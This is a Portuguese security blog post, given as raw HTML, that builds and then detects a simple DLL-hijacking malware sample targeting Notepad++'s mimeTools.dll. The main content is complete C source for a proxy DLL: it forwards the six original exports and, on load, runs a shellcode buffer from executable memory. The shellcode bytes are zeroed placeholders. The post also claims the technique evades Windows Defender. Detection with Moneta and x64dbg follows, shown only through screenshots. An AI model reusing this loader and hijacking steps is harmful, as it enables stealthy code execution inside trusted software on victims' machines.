<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="../images/50.png" type="image/x-icon">
  <title>Malware-Analysis</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', (event) => {
      document.querySelectorAll('pre code').forEach((block) => {
        hljs.highlightElement(block);
      });
    });
  </script>
  <style>
    ::-webkit-scrollbar {
      width: 10px;
    }

    ::-webkit-scrollbar-track {
      background: #333;
    }

    ::-webkit-scrollbar-thumb {
      background: #555;
      border-radius: 5px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: #777;
    }

    html {
      scrollbar-color: #555 #333;
      scrollbar-width: thin;
    }
  </style>
  <style>
    pre {
      background-color: #1e1e1e;
      color: #ffffff;
      padding: 15px;
      border-radius: 8px;
      overflow-x: auto;
      font-family: 'Courier New', monospace;
      font-size: 14px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
    }
  </style>
  <link rel="stylesheet" href="../style.css">
  <link rel="stylesheet" href="../text_style.css">
  <link rel="stylesheet" href="../dimensao.css">
  <link rel="stylesheet" href="../background.css">
  <link rel="stylesheet" href="../head_style.css">
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
</head>

<body>
  <header style="height: 55px;">
    <div class="logo">
      <img src="../images/50.png" height="40" alt="Vith0r logo"
        style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
      <h2>
        <a href="https://vith0r.github.io"
          style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
          &nbsp;VITHOR
        </a>
      </h2>
    </div>
    <nav>
      <div class="toggle-container">
        <a href="../whoami.html">
          <button class="tutorials-toggle"><i></i>Whoami</button>
        </a>
        <a href="../posts.html">
          <button class="tools-toggle"><i></i>Posts</button>
        </a>
        <a href="../projects.html">
          <button class="tools-toggle"><i></i>Projects</button>
        </a>
      </div>
    </nav>
  </header>
  <script>
    const element = document.querySelector('.logo h2 a');
    const targetWord = "VITHOR";

    function getRandomString(length) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }

    function animateRandomization(element, targetWord) {
      const originalWord = targetWord.split('');
      let iterations = 0;
      const maxIterations = 15;
      let currentWord = getRandomString(targetWord.length).split('');
      let currentIndex = 0;

      element.style.display = 'inline-block';
      element.style.width = `${element.offsetWidth}px`;
      element.style.position = 'relative';
      element.style.left = '5px';

      const interval = setInterval(() => {
        if (iterations < maxIterations) {
          currentWord = getRandomString(targetWord.length).split('');
          iterations++;
        } else {
          if (currentIndex < targetWord.length) {
            currentWord[currentIndex] = originalWord[currentIndex];
            currentIndex++;
          } else {
            clearInterval(interval);
          }
        }
        element.textContent = currentWord.join('');
      }, 60);
    }

    setInterval(() => {
      animateRandomization(element, targetWord);
    }, 10000);

    element.addEventListener('mouseover', () => {
      animateRandomization(element, targetWord);
    });

    animateRandomization(element, targetWord);
  </script>

  <body>
    <div class="grain-header"></div>
    <main>
      <div class="box">
        <h1
          style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
          Análise de Malware 2</h1>
        <br>
        <p>Posted Apr 23, 2024. 4 min read</p>
        <br>
        <div class="post-author">
          <a href="https://github.com/Vith0r" target="_blank">
            <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
            <span>Vithor</span>
          </a>
        </div>

        <article>
          <div style="font-size: 16px;">
            <p>Neste post eu vou criar e analisar um malware simples, para isso vamos estar &quot;sequestrando&quot; uma
              Dll do <a href="https://notepad-plus-plus.org/downloads/" href="https://notepad-plus-plus.org/downloads/"
                style="color: #9E2525;">Notepad++</a>.</p>
            <br>
            <div style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
              ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra
              coisa são estritamente para fins educacionais.
            </div>
            <br>
            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Criação do
              Malware</h2>
            <p>Para sequestrar a DLL do <span style="color: #9E2525;">Notepad++</span>, primeiro precisamos identificar
              quais DLLs presentes nos arquivos do <span style="color: #9E2525;">Notepad++</span> são carregadas assim
              que o programa é aberto.<br>Para isso podemos utilizar o <a
                href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
                href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon"
                style="color: #9E2525;">ProcessMonitor</a>, a única coisa que precisamos fazer no <span
                style="color: #9E2525;">ProcessMonitor</span> é colocar que o nome do processo que queremos analisar que
              é o <span style="color: #9E2525;">notepad++.exe</span><br>Após isso apenas temos que executar o arquivo
              para ver o que o <span style="color: #9E2525;">ProcessMonitor</span> nos informa:</p>
            <br>
            <p><img src="https://telegra.ph/file/c596e54112c2952e17af9.png" alt="ProcessMonitor"
                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
            <br>
            <p>Como podemos ver, a Dll chamada <span style="color: #9E2525;">mimeTools</span> esta sendo carregada então
              vamos olhar as funções que essa Dll exporta, para isso podemos utilizar o <a
                href="https://github.com/hasherezade/pe-bear" href="https://github.com/hasherezade/pe-bear"
                style="color: #9E2525;">PE-Bear</a>:</p>
            <br>
            <p><img src="https://telegra.ph/file/fc7dad13fadb66291f4c7.png" alt="PE-Bear"
                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
            <br>
            <p>Como podemos ver, a <span style="color: #9E2525;">mimeTools.dll</span> exporta 6 funções então vamos
              copiar elas para utilizar no nosso código:</p>
            <br>
            <pre
              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> <span class="hljs-keyword">warning</span>(disable : 4996)</span>

<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:beNotified=original.beNotified,@1&quot;</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:getFuncsArray=original.getFuncsArray,@2&quot;</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:getName=original.getName,@3&quot;</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:isUnicode=original.isUnicode,@4&quot;</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:messageProc=original.messageProc,@5&quot;</span>)</span>
<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:setInfo=original.setInfo,@6&quot;</span>)</span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LoadShellcodeIntoMemory</span><span class="hljs-params">()</span> </span>{

	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Shellcode[<span class="hljs-number">176</span>] = { <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> };


    <span class="hljs-type">size_t</span> size = <span class="hljs-built_in">sizeof</span>(Shellcode);

    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    <span class="hljs-keyword">if</span> (exec != <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">memcpy</span>(exec, Shellcode, size);
        ((<span class="hljs-built_in">void</span>(*)())exec)();
    }
}

<span class="hljs-function">DWORD WINAPI <span class="hljs-title">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>
</span>{
    <span class="hljs-built_in">LoadShellcodeIntoMemory</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)</span>
</span>{
    HANDLE threadHandle;

    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:

        threadHandle = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
        <span class="hljs-built_in">CloseHandle</span>(threadHandle);
        <span class="hljs-keyword">break</span>;

    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-keyword">break</span>;
    }

    <span class="hljs-keyword">return</span> TRUE;
}
</pre>
            <br>
            <p>Bom agora a única coisa que vamos precisar fazer é renomear nosso <span
                style="color: #9E2525;">DllProxy.dll</span> para <span style="color: #9E2525;">mimeTools.dll</span> e
              renomear a <span style="color: #9E2525;">mimeTools.dll</span> para <span
                style="color: #9E2525;">original.dll</span>, e pronto agora quando executarmos o <span
                style="color: #9E2525;">Notepad++.exe</span> ele vai carregar nossa dll maliciosa, vamos testar isso:
            </p>
            <br>
            <p><img src="https://telegra.ph/file/ca49e80bb10a55454ca1a.gif" alt="Notepad++"
                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
            <br>
            <p>Como podemos observar, além de funcionar perfeitamente, contornamos o <span
                style="color: #9E2525;">Windows-Defender</span>.</p>
            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Análise do
              Malware</h2>
            <p>Para encontrar esse malware vou estar utilizando o <a href="https://github.com/forrest-orr/moneta"
                href="https://github.com/forrest-orr/moneta" style="color: #9E2525;">Moneta</a> e o <a
                href="https://x64dbg.com" href="https://x64dbg.com" style="color: #9E2525;">x64dbg</a>.</p>
            <p>Vamos então executar o <span style="color: #9E2525;">Notepad++</span> e analisar o processo do <span
                style="color: #9E2525;">Notepad++</span>com o <span style="color: #9E2525;">Moneta</span>:</p>
            <br>
            <p><img src="https://telegra.ph/file/9163012e91bf31c9ae191.gif" alt="Moneta"
                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
            <br>
            <p>Agora pegamos o endereço de memória que o <span style="color: #9E2525;">moneta</span> nos entregou, e no
              <span style="color: #9E2525;">X64.dbg</span> anexamos o <span style="color: #9E2525;">Notepad++</span>,
              para ir para esse endereço de memória entregue pelo <span style="color: #9E2525;">Monteta</span>, então
              seguimos no despejo do <span style="color: #9E2525;">x64dbg</span> para poder então dumpar o conteudo para
              poder analisar com o <span style="color: #9E2525;">VirusTotal</span>:
            </p>
            <br>
            <p><img src="https://telegra.ph/file/bef65c9ee81d47b14b9ab.gif" alt="X64.dbg"
                style="max-width: 100%; height: auto; width: 700px; display: block; margin: 20px auto;"></p>
            <p><img src="https://telegra.ph/file/c5f0ef108ffe7b8eb26ae.gif" alt="VirtusTotal"
                style="max-width: 100%; height: auto; width: 700px; display: block; margin: 20px auto;"></p>
            <br>
            <p>Por fim, concluímos mais uma análise de malware simples, utilizando ferramentas que podem ser muito úteis
              em casos específicos.</p>
          </div>
        </article>
      </div>
    </main>
    <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
      <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
    </footer>
    <script>
      function isMobileDevice() {
        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
      }

      if (isMobileDevice()) {
        alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
        window.location.href = "https://www.google.com";
      }
    </script>
  </body>

</html>